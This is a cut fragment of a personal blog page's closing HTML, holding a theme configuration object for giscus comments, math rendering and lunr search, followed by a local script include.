type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{"giscus":{"category":"Announcements","categoryId":"DIC_kwDOG4BtJM4CTls2","darkTheme":"dark","emitMetadata":"0","inputPosition":"bottom","lang":"zh-CN","lazyLoading":false,"lightTheme":"light","mapping":"og:title","reactionsEnabled":"1","repo":"mi3aka/mi3aka.github.io","repoId":"R_kgDOG4BtJA"}},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
